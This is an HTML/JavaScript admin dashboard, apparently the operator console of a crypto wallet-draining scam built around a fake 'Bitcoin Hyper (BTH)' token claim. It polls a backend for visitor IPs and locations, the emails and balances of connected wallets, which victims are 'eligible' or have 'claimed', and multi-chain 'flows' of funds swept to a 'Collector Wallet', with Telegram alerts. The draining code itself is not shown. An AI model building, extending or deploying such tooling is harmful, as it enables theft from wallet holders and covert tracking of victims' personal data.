<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔐 FlowRouter Pro Admin | MultiChain Transaction Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 24px;
        }

        .container {
            max-width: 1600px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
            padding: 20px 24px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 24px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .header-left h1 {
            font-size: 28px;
            font-weight: 600;
            background: linear-gradient(135deg, #fff, #a5b4fc, #60a5fa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
            letter-spacing: -0.5px;
        }

        .header-left .subtitle {
            color: #8f9bb5;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .header-right {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .status-badge {
            padding: 8px 16px;
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            border-radius: 30px;
            color: #ef4444;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }

        .status-badge.connected {
            background: rgba(52, 211, 153, 0.1);
            border-color: #34d399;
            color: #34d399;
        }

        .refresh-btn {
            padding: 10px 24px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 30px;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .refresh-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 24px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, #60a5fa, #a78bfa, #34d399);
            opacity: 0;
            transition: opacity 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.1);
        }

        .stat-card:hover::before {
            opacity: 1;
        }

        .stat-label {
            color: #8f9bb5;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .stat-value {
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 8px;
            line-height: 1;
        }

        .stat-sub {
            color: #5a6a8a;
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .stat-value.blue { color: #60a5fa; text-shadow: 0 0 20px rgba(96, 165, 250, 0.3); }
        .stat-value.purple { color: #a78bfa; text-shadow: 0 0 20px rgba(167, 139, 250, 0.3); }
        .stat-value.orange { color: #fbbf24; text-shadow: 0 0 20px rgba(251, 191, 36, 0.3); }
        .stat-value.green { color: #34d399; text-shadow: 0 0 20px rgba(52, 211, 153, 0.3); }

        .section-title {
            font-size: 20px;
            font-weight: 600;
            margin: 30px 0 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .section-title span:first-child {
            background: linear-gradient(135deg, #fff, #a5b4fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .networks-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 16px;
            margin-bottom: 30px;
        }

        .network-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 20px;
            display: flex;
            align-items: center;
            gap: 16px;
            transition: all 0.3s;
        }

        .network-card:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.1);
        }

        .network-icon {
            width: 52px;
            height: 52px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .network-info {
            flex: 1;
        }

        .network-name {
            font-weight: 600;
            margin-bottom: 4px;
            font-size: 16px;
        }

        .network-address {
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 12px;
            color: #8f9bb5;
            margin-bottom: 8px;
        }

        .network-status {
            font-size: 13px;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-dot.active { 
            background: #34d399; 
            box-shadow: 0 0 15px #34d399;
            animation: pulse 2s infinite;
        }
        .status-dot.inactive { background: #ef4444; }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.1); }
            100% { opacity: 1; transform: scale(1); }
        }

        .table-container {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.03);
            border-radius: 24px;
            overflow: hidden;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
        }

        .table-header {
            padding: 20px 24px;
            background: rgba(0, 0, 0, 0.3);
            font-weight: 600;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }

        .table-header h3 {
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .badge {
            padding: 4px 12px;
            background: rgba(96, 165, 250, 0.1);
            border: 1px solid rgba(96, 165, 250, 0.2);
            border-radius: 30px;
            font-size: 12px;
            color: #60a5fa;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th {
            text-align: left;
            padding: 16px 24px;
            color: #8f9bb5;
            font-weight: 500;
            font-size: 13px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            background: rgba(0, 0, 0, 0.2);
        }

        td {
            padding: 16px 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            font-size: 14px;
        }

        tr:hover td {
            background: rgba(255, 255, 255, 0.02);
        }

        .wallet-address {
            font-family: 'Monaco', 'Menlo', monospace;
            color: #a5b4fc;
        }

        .flag-icon {
            font-size: 20px;
            margin-right: 8px;
        }

        .amount {
            font-weight: 600;
            color: #34d399;
        }

        .location-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
            gap: 12px;
            padding: 24px;
        }

        .location-item {
            background: rgba(255, 255, 255, 0.02);
            padding: 16px;
            border-radius: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            transition: all 0.3s;
        }

        .location-item:hover {
            background: rgba(255, 255, 255, 0.03);
            border-color: rgba(255, 255, 255, 0.1);
            transform: translateX(5px);
        }

        .loading {
            text-align: center;
            padding: 80px;
            color: #8f9bb5;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255, 255, 255, 0.05);
            border-top-color: #60a5fa;
            border-right-color: #a78bfa;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .tabs {
            display: flex;
            gap: 10px;
            margin: 30px 0 20px;
            flex-wrap: wrap;
        }

        .tab {
            padding: 10px 24px;
            border-radius: 30px;
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.1);
            color: #8f9bb5;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 14px;
            font-weight: 500;
        }

        .tab:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.2);
            color: #fff;
        }

        .tab.active {
            background: linear-gradient(135deg, #60a5fa, #a78bfa);
            border-color: transparent;
            color: #fff;
            box-shadow: 0 4px 15px rgba(96, 165, 250, 0.3);
        }

        .tooltip {
            position: relative;
            display: inline-block;
            cursor: help;
        }

        .tooltip:hover .tooltip-text {
            visibility: visible;
            opacity: 1;
            transform: translateY(0);
        }

        .tooltip-text {
            visibility: hidden;
            opacity: 0;
            position: absolute;
            background: #1e1e2f;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 12px;
            white-space: nowrap;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%) translateY(-10px);
            transition: all 0.3s;
            pointer-events: none;
            z-index: 100;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
        }

        .hourly-activity {
            padding: 24px;
            display: flex;
            align-items: flex-end;
            gap: 8px;
            height: 220px;
            overflow-x: auto;
        }

        .hour-bar {
            flex: 1;
            min-width: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
        }

        .bar-fill {
            width: 100%;
            background: linear-gradient(180deg, #60a5fa, #a78bfa);
            border-radius: 8px 8px 0 0;
            transition: height 0.3s;
            position: relative;
        }

        .bar-fill:hover {
            opacity: 0.9;
            transform: scaleX(1.05);
        }

        .bar-label {
            font-size: 11px;
            color: #8f9bb5;
        }

        .bar-value {
            font-size: 10px;
            color: #60a5fa;
            font-weight: 600;
        }

        .error-container {
            text-align: center;
            padding: 60px;
            background: rgba(239, 68, 68, 0.05);
            border-radius: 24px;
            border: 1px solid rgba(239, 68, 68, 0.2);
        }

        .error-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }

        .error-title {
            color: #ef4444;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .error-message {
            color: #8f9bb5;
            margin-bottom: 24px;
        }

        .retry-btn {
            padding: 12px 32px;
            background: linear-gradient(135deg, #60a5fa, #a78bfa);
            border: none;
            border-radius: 30px;
            color: #fff;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .retry-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(96, 165, 250, 0.3);
        }

        .system-info {
            margin-top: 30px;
            padding: 24px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }

        .info-item {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .info-label {
            color: #8f9bb5;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .info-value {
            font-weight: 600;
            font-size: 16px;
        }

        .info-value.small {
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 14px;
            color: #a5b4fc;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-left">
                <h1>🔐 FlowRouter Pro Admin</h1>
                <div class="subtitle">
                    <span>MultiChain Transaction Dashboard</span>
                    <span>•</span>
                    <span id="liveTimestamp">Loading...</span>
                </div>
            </div>
            <div class="header-right">
                <div class="status-badge" id="telegramStatus">📡 TELEGRAM DISABLED</div>
                <button class="refresh-btn" onclick="loadDashboard()">
                    <span>🔄</span>
                    <span>Refresh Data</span>
                </button>
            </div>
        </div>

        <div id="dashboardContent">
            <div class="loading">
                <div class="loading-spinner"></div>
                <div>Loading dashboard data...</div>
                <div style="font-size: 12px; margin-top: 10px; color: #5a6a8a;">Connecting to backend: https://bthbk.vercel.app</div>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION - UPDATE WITH YOUR TOKEN
        // ============================================
        const ADMIN_TOKEN = 'YourSecureTokenHere123!'; // Make sure this matches your backend
        const BACKEND_URL = 'https://bthbk.vercel.app';

        // ============================================
        // SAFE UTILITY FUNCTIONS - PREVENTS ALL UNDEFINED ERRORS
        // ============================================
        function safeArray(data) {
            return Array.isArray(data) ? data : [];
        }

        function safeObject(obj, defaultValue = {}) {
            return (obj && typeof obj === 'object') ? obj : defaultValue;
        }

        function safeNumber(num, defaultValue = 0) {
            const parsed = parseFloat(num);
            return isNaN(parsed) ? defaultValue : parsed;
        }

        function safeString(str, defaultValue = '') {
            return str ? String(str) : defaultValue;
        }

        // ============================================
        // LOAD DASHBOARD DATA
        // ============================================
        async function loadDashboard() {
            try {
                // Show loading state
                document.getElementById('dashboardContent').innerHTML = `
                    <div class="loading">
                        <div class="loading-spinner"></div>
                        <div>Loading dashboard data...</div>
                        <div style="font-size: 12px; margin-top: 10px; color: #5a6a8a;">Fetching from: ${BACKEND_URL}</div>
                    </div>
                `;

                // Update timestamp
                document.getElementById('liveTimestamp').textContent = new Date().toLocaleTimeString();

                // Fetch data from backend
                const response = await fetch(`${BACKEND_URL}/api/admin/dashboard?token=${ADMIN_TOKEN}`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json',
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }

                const rawData = await response.json();
                console.log('API Response:', rawData); // For debugging

                if (!rawData.success) {
                    throw new Error(rawData.error || 'Unauthorized access');
                }

                // ============================================
                // CRITICAL FIX: SAFELY INITIALIZE ALL DATA WITH DEFAULTS
                // ============================================
                const data = {
                    success: rawData.success,
                    timestamp: rawData.timestamp || new Date().toISOString(),
                    summary: safeObject(rawData.summary),
                    networks: safeArray(rawData.networks),
                    recentVisits: safeArray(rawData.recentVisits),
                    activeParticipants: safeArray(rawData.activeParticipants),
                    pendingFlows: safeArray(rawData.pendingFlows),
                    completedFlows: safeArray(rawData.completedFlows),
                    processedTransactions: safeArray(rawData.processedTransactions),
                    locationStats: safeArray(rawData.locationStats),
                    hourlyActivity: safeArray(rawData.hourlyActivity),
                    system: safeObject(rawData.system)
                };

                // Render the dashboard with safe data
                renderDashboard(data);

            } catch (error) {
                console.error('Dashboard load error:', error);
                
                document.getElementById('dashboardContent').innerHTML = `
                    <div class="error-container">
                        <div class="error-icon">❌</div>
                        <div class="error-title">Connection Error</div>
                        <div class="error-message">${error.message}</div>
                        <div style="background: rgba(0,0,0,0.3); padding: 16px; border-radius: 12px; margin: 20px 0; text-align: left;">
                            <div style="color: #8f9bb5; margin-bottom: 8px;">Debug Info:</div>
                            <div style="font-family: monospace; font-size: 12px; color: #a5b4fc;">
                                Backend URL: ${BACKEND_URL}<br>
                                Endpoint: /api/admin/dashboard<br>
                                Token: ${ADMIN_TOKEN.substring(0, 5)}...${ADMIN_TOKEN.substring(ADMIN_TOKEN.length - 5)}<br>
                                Timestamp: ${new Date().toISOString()}
                            </div>
                        </div>
                        <button class="retry-btn" onclick="loadDashboard()">Retry Connection</button>
                    </div>
                `;
            }
        }

        // ============================================
        // RENDER DASHBOARD - WITH COMPLETE SAFETY CHECKS
        // ============================================
        function renderDashboard(data) {
            // All data is now guaranteed to be safe arrays/objects
            const summary = data.summary;
            const networks = data.networks;
            const recentVisits = data.recentVisits;
            const activeParticipants = data.activeParticipants;
            const pendingFlows = data.pendingFlows;
            const completedFlows = data.completedFlows;
            const processedTransactions = data.processedTransactions;
            const locationStats = data.locationStats;
            const hourlyActivity = data.hourlyActivity;
            const system = data.system;
            
            // Update telegram status
            const telegramEl = document.getElementById('telegramStatus');
            if (summary.telegramStatus === '✅ Connected') {
                telegramEl.innerHTML = '📡 TELEGRAM CONNECTED';
                telegramEl.className = 'status-badge connected';
            } else {
                telegramEl.innerHTML = '📡 TELEGRAM DISABLED';
                telegramEl.className = 'status-badge';
            }

            // Safe calculations
            const totalVisits = safeNumber(summary.totalVisits);
            const uniqueIPs = safeNumber(summary.uniqueIPs);
            const totalParticipants = safeNumber(summary.totalParticipants);
            const eligibleParticipants = safeNumber(summary.eligibleParticipants);
            const claimedParticipants = safeNumber(summary.claimedParticipants);
            const totalProcessedUSD = safeNumber(summary.totalProcessedUSD);
            const totalProcessedWallets = safeNumber(summary.totalProcessedWallets);
            const completedFlowsCount = safeNumber(summary.completedFlows);

            // Safe percentages
            const eligiblePercentage = totalParticipants > 0 
                ? ((eligibleParticipants / totalParticipants) * 100).toFixed(1) 
                : '0';
            
            const claimRate = eligibleParticipants > 0 
                ? ((claimedParticipants / eligibleParticipants) * 100).toFixed(1) 
                : '0';

            // Safe network active count
            const activeNetworks = networks.filter(n => n.status && n.status.includes('Active')).length;

            // Safe hourly activity calculations
            const hourlyCounts = hourlyActivity.map(h => safeNumber(h.count));
            const maxHourly = hourlyCounts.length > 0 ? Math.max(...hourlyCounts) : 0;

            const html = `
                <!-- Stats Grid -->
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-label">
                            <span>👁️</span> Total Visits
                        </div>
                        <div class="stat-value blue">${totalVisits}</div>
                        <div class="stat-sub">
                            <span>🌐 Unique IPs: ${uniqueIPs}</span>
                            <span>•</span>
                            <span>${locationStats.length} countries</span>
                        </div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-label">
                            <span>👥</span> Participants
                        </div>
                        <div class="stat-value purple">${totalParticipants}</div>
                        <div class="stat-sub">
                            <span>✅ Eligible: ${eligibleParticipants}</span>
                            <span>•</span>
                            <span>${eligiblePercentage}%</span>
                        </div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-label">
                            <span>🎯</span> Claims
                        </div>
                        <div class="stat-value orange">${claimedParticipants}</div>
                        <div class="stat-sub">
                            <span>📊 ${claimRate}% of eligible</span>
                        </div>
                    </div>
                    
                    <div class="stat-card">
                        <div class="stat-label">
                            <span>💰</span> Total Processed
                        </div>
                        <div class="stat-value green">$${totalProcessedUSD.toLocaleString()}</div>
                        <div class="stat-sub">
                            <span>🔐 ${totalProcessedWallets} wallets</span>
                            <span>•</span>
                            <span>🔄 ${completedFlowsCount} flows</span>
                        </div>
                    </div>
                </div>

                <!-- Networks Status -->
                <div class="section-title">
                    <span>🌐 Networks Status</span>
                    <span class="badge">${activeNetworks} Active</span>
                    <span class="badge">Collector: ${system.collectorWallet ? system.collectorWallet.substring(0, 10) + '...' : 'N/A'}</span>
                </div>
                
                <div class="networks-grid">
                    ${networks.length > 0 ? networks.map(network => `
                        <div class="network-card">
                            <div class="network-icon">${getNetworkIcon(network.chain)}</div>
                            <div class="network-info">
                                <div class="network-name">${safeString(network.chain)}</div>
                                <div class="network-address tooltip">
                                    ${network.contract ? network.contract.substring(0, 10) + '...' + network.contract.substring(36) : 'Not deployed'}
                                    ${network.contract ? `<span class="tooltip-text">${network.contract}</span>` : ''}
                                </div>
                                <div class="network-status">
                                    <span class="status-dot ${network.status && network.status.includes('Active') ? 'active' : 'inactive'}"></span>
                                    ${safeString(network.status)}
                                </div>
                            </div>
                        </div>
                    `).join('') : `
                        <div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #8f9bb5;">
                            No network data available
                        </div>
                    `}
                </div>

                <!-- Tabs Navigation -->
                <div class="tabs">
                    <button class="tab active" onclick="showTab('visits', event)">👁️ Recent Visits</button>
                    <button class="tab" onclick="showTab('participants', event)">👥 Participants</button>
                    <button class="tab" onclick="showTab('flows', event)">🔄 Pending Flows</button>
                    <button class="tab" onclick="showTab('transactions', event)">💰 Transactions</button>
                    <button class="tab" onclick="showTab('locations', event)">📍 Locations</button>
                </div>

                <!-- Visits Tab -->
                <div id="tab-visits" class="tab-content">
                    <div class="table-container">
                        <div class="table-header">
                            <h3>
                                <span>👁️ Recent Site Visits</span>
                                <span class="badge">Live tracking</span>
                            </h3>
                            <span class="badge">Last ${recentVisits.length} visits</span>
                        </div>
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Location</th>
                                    <th>IP</th>
                                    <th>Device</th>
                                    <th>Type</th>
                                    <th>Wallet</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${recentVisits.length > 0 ? recentVisits.map(visit => `
                                    <tr>
                                        <td>${new Date(visit.timestamp).toLocaleString()}</td>
                                        <td>
                                            <span class="flag-icon">${visit.flag || '🌍'}</span> 
                                            ${visit.country || 'Unknown'}${visit.city ? `, ${visit.city}` : ''}
                                        </td>
                                        <td class="wallet-address">${visit.ip || 'N/A'}</td>
                                        <td>${visit.deviceType || 'Unknown'}</td>
                                        <td>${visit.isHuman ? '👤 Human' : '🤖 Bot'}</td>
                                        <td>${visit.walletConnected ? '✅ Connected' : '❌ Not connected'}</td>
                                    </tr>
                                `).join('') : `
                                    <tr>
                                        <td colspan="6" style="text-align: center; color: #8f9bb5; padding: 40px;">
                                            No visits yet. Waiting for first visitor...
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Participants Tab -->
                <div id="tab-participants" class="tab-content" style="display: none;">
                    <div class="table-container">
                        <div class="table-header">
                            <h3>
                                <span>👥 Active Participants</span>
                                <span class="badge">Eligible: ${eligibleParticipants}</span>
                            </h3>
                            <span class="badge">${activeParticipants.length} total</span>
                        </div>
                        <table>
                            <thead>
                                <tr>
                                    <th>Wallet</th>
                                    <th>Location</th>
                                    <th>Email</th>
                                    <th>Balance</th>
                                    <th>Status</th>
                                    <th>Connected</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${activeParticipants.length > 0 ? activeParticipants.map(p => `
                                    <tr>
                                        <td class="wallet-address tooltip">
                                            ${p.walletAddress ? p.walletAddress.substring(0, 8) + '...' + p.walletAddress.substring(36) : 'N/A'}
                                            <span class="tooltip-text">${p.walletAddress || 'N/A'}</span>
                                        </td>
                                        <td>
                                            <span class="flag-icon">${p.flag || '🌍'}</span> 
                                            ${p.country || 'Unknown'}${p.city ? `, ${p.city}` : ''}
                                        </td>
                                        <td>${p.email || 'N/A'}</td>
                                        <td class="amount">$${safeNumber(p.totalValueUSD).toFixed(2)}</td>
                                        <td>
                                            ${p.isEligible ? '✅ Eligible' : '👋 Welcome'}
                                            ${p.claimed ? ' (Claimed)' : ''}
                                        </td>
                                        <td>${p.connectedAt ? new Date(p.connectedAt).toLocaleDateString() : 'N/A'}</td>
                                    </tr>
                                `).join('') : `
                                    <tr>
                                        <td colspan="6" style="text-align: center; color: #8f9bb5; padding: 40px;">
                                            No participants yet. Waiting for first connection...
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Flows Tab -->
                <div id="tab-flows" class="tab-content" style="display: none;">
                    <div class="table-container">
                        <div class="table-header">
                            <h3>
                                <span>🔄 Pending Flows</span>
                                <span class="badge">Active processing</span>
                            </h3>
                            <span class="badge">${pendingFlows.length} pending</span>
                        </div>
                        <table>
                            <thead>
                                <tr>
                                    <th>Flow ID</th>
                                    <th>Wallet</th>
                                    <th>Total Value</th>
                                    <th>Chains</th>
                                    <th>Progress</th>
                                    <th>Created</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${pendingFlows.length > 0 ? pendingFlows.map(flow => `
                                    <tr>
                                        <td class="wallet-address tooltip">
                                            ${flow.id ? flow.id.substring(0, 12) + '...' : 'N/A'}
                                            <span class="tooltip-text">${flow.id || 'N/A'}</span>
                                        </td>
                                        <td class="wallet-address">${flow.walletAddress ? flow.walletAddress.substring(0, 8) + '...' : 'N/A'}</td>
                                        <td class="amount">$${safeNumber(flow.totalFlowUSD).toFixed(2)}</td>
                                        <td>${safeArray(flow.transactions).length}</td>
                                        <td>${safeArray(flow.completedChains).length}/${safeArray(flow.transactions).length} chains</td>
                                        <td>${flow.createdAt ? new Date(flow.createdAt).toLocaleString() : 'N/A'}</td>
                                    </tr>
                                `).join('') : `
                                    <tr>
                                        <td colspan="6" style="text-align: center; color: #8f9bb5; padding: 40px;">
                                            No pending flows
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Transactions Tab -->
                <div id="tab-transactions" class="tab-content" style="display: none;">
                    <div class="table-container">
                        <div class="table-header">
                            <h3>
                                <span>💰 Recent Transactions</span>
                                <span class="badge">On-chain</span>
                            </h3>
                            <span class="badge">Last ${processedTransactions.length} transactions</span>
                        </div>
                        <table>
                            <thead>
                                <tr>
                                    <th>Time</th>
                                    <th>Wallet</th>
                                    <th>Chain</th>
                                    <th>Flow ID</th>
                                    <th>Transaction Hash</th>
                                </tr>
                            </thead>
                            <tbody>
                                ${processedTransactions.length > 0 ? processedTransactions.map(tx => `
                                    <tr>
                                        <td>${new Date(tx.timestamp).toLocaleString()}</td>
                                        <td class="wallet-address tooltip">
                                            ${tx.wallet ? tx.wallet.substring(0, 8) + '...' : 'N/A'}
                                            <span class="tooltip-text">${tx.wallet || 'N/A'}</span>
                                        </td>
                                        <td>${tx.chain || 'N/A'}</td>
                                        <td class="wallet-address tooltip">
                                            ${tx.flowId ? tx.flowId.substring(0, 12) + '...' : 'N/A'}
                                            <span class="tooltip-text">${tx.flowId || 'N/A'}</span>
                                        </td>
                                        <td class="wallet-address tooltip">
                                            ${tx.txHash ? tx.txHash.substring(0, 10) + '...' : 'N/A'}
                                            <span class="tooltip-text">${tx.txHash || 'N/A'}</span>
                                        </td>
                                    </tr>
                                `).join('') : `
                                    <tr>
                                        <td colspan="5" style="text-align: center; color: #8f9bb5; padding: 40px;">
                                            No transactions yet
                                        </td>
                                    </tr>
                                `}
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Locations Tab -->
                <div id="tab-locations" class="tab-content" style="display: none;">
                    <div class="table-container">
                        <div class="table-header">
                            <h3>
                                <span>📍 Geographic Distribution</span>
                                <span class="badge">Global reach</span>
                            </h3>
                            <span class="badge">${locationStats.length} countries</span>
                        </div>
                        <div class="location-grid">
                            ${locationStats.length > 0 ? locationStats.map(loc => `
                                <div class="location-item">
                                    <span class="flag-icon">${loc.flag || '🌍'}</span>
                                    <div style="flex: 1;">
                                        <div style="font-weight: 600;">${loc.country || 'Unknown'}</div>
                                        <div style="font-size: 13px; color: #8f9bb5;">
                                            ${safeNumber(loc.count)} visitors 
                                            ${loc.eligible ? `(${safeNumber(loc.eligible)} eligible)` : ''}
                                        </div>
                                    </div>
                                </div>
                            `).join('') : `
                                <div style="text-align: center; padding: 40px; color: #8f9bb5; grid-column: 1/-1;">
                                    No location data yet
                                </div>
                            `}
                        </div>
                    </div>
                </div>

                <!-- Hourly Activity -->
                <div class="table-container">
                    <div class="table-header">
                        <h3>
                            <span>📊 Hourly Activity</span>
                            <span class="badge">24h distribution</span>
                        </h3>
                        <span class="badge">Peak: ${maxHourly} visits</span>
                    </div>
                    <div class="hourly-activity">
                        ${hourlyActivity.length > 0 ? (() => {
                            const max = maxHourly || 1;
                            return hourlyActivity.map(hour => {
                                const count = safeNumber(hour.count);
                                const height = (count / max) * 180;
                                return `
                                    <div class="hour-bar">
                                        <div class="bar-fill" style="height: ${height}px;"></div>
                                        <div class="bar-label">${hour.hour || 0}:00</div>
                                        <div class="bar-value">${count}</div>
                                    </div>
                                `;
                            }).join('');
                        })() : '<div style="color: #8f9bb5; text-align: center; width: 100%;">No activity data</div>'}
                    </div>
                </div>

                <!-- System Information -->
                <div class="system-info">
                    <div class="info-item">
                        <div class="info-label">Token</div>
                        <div class="info-value">${safeString(system.tokenName, 'Bitcoin Hyper')} (${safeString(system.tokenSymbol, 'BTH')})</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Threshold</div>
                        <div class="info-value">$${safeNumber(system.valueThreshold, 1)}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Collector Wallet</div>
                        <div class="info-value small tooltip">
                            ${system.collectorWallet ? system.collectorWallet.substring(0, 10) + '...' + system.collectorWallet.substring(36) : 'N/A'}
                            <span class="tooltip-text">${system.collectorWallet || 'N/A'}</span>
                        </div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Last Update</div>
                        <div class="info-value">${new Date(data.timestamp).toLocaleString()}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Telegram Bot</div>
                        <div class="info-value">${summary.telegramBot || 'N/A'}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label">Flow Enabled</div>
                        <div class="info-value">${system.flowEnabled ? '✅ Yes' : '❌ No'}</div>
                    </div>
                </div>
            `;

            document.getElementById('dashboardContent').innerHTML = html;
        }

        // ============================================
        // HELPER FUNCTIONS
        // ============================================
        function getNetworkIcon(chain) {
            const icons = {
                'Ethereum': '⟠',
                'BSC': '🟡',
                'Polygon': '⬢',
                'Arbitrum': '🔷',
                'Avalanche': '🔴',
                'Optimism': '🔴'
            };
            return icons[chain] || '🌐';
        }

        function showTab(tabName, event) {
            // Update tab buttons
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            event.target.classList.add('active');
            
            // Show selected tab content
            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
            const tabElement = document.getElementById(`tab-${tabName}`);
            if (tabElement) {
                tabElement.style.display = 'block';
            }
        }

        // ============================================
        // INITIALIZE
        // ============================================
        
        // Load dashboard immediately
        loadDashboard();
        
        // Auto-refresh every 30 seconds
        setInterval(loadDashboard, 30000);
        
        // Update live timestamp every second
        setInterval(() => {
            document.getElementById('liveTimestamp').textContent = new Date().toLocaleTimeString();
        }, 1000);
    </script>
</body>
</html>
